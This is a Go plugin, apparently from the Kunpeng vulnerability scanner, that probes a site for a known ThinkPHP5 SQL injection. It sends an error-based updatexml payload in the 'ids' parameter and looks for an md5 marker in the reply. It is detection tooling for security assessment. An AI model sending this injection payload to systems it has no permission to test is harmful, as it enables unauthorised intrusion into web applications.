package goplugin

import (
	"net/http"
	"strings"

	"github.com/opensec-cn/kunpeng/plugin"
	"github.com/opensec-cn/kunpeng/util"
)

type thinkphp5SQLIResult struct {
	info   plugin.Plugin
	result []plugin.Plugin
}

func init() {
	plugin.Regist("thinkphp", &thinkphp5SQLIResult{})
}

func (d *thinkphp5SQLIResult) Init() plugin.Plugin {
	d.info = plugin.Plugin{
		Name:    "ThinkPHP5 SQL Injection Vulnerability",
		Remarks: "ThinkPHP5 SQL Injection Vulnerability in index.php?ids && Sensitive Information Disclosure Vulnerability",
		Level:   1,
		Type:    "SQLI",
		Author:  "neargle",
		References: plugin.References{
			URL: "https://www.leavesongs.com/PENETRATION/thinkphp5-in-sqlinjection.html",
			CVE: "",
		},
	}
	return d.info
}

func (d *thinkphp5SQLIResult) GetResult() []plugin.Plugin {
	return d.result
}

func (d *thinkphp5SQLIResult) Check(URL string, meta plugin.TaskMeta) bool {
	url := URL + "/index.php?ids[0,updatexml(0,concat(0xa,md5(2333333)),0)]=1"
	request, err := http.NewRequest("GET", url, nil)
	resp, err := util.RequestDo(request, true)
	if err != nil {
		return false
	}
	if strings.Contains(resp.ResponseRaw, "e0793e2479f297230fa98558bc1d656") {
		result := d.info
		result.Response = resp.ResponseRaw
		result.Request = resp.RequestRaw
		d.result = append(d.result, result)
		return true
	}
	return false
}
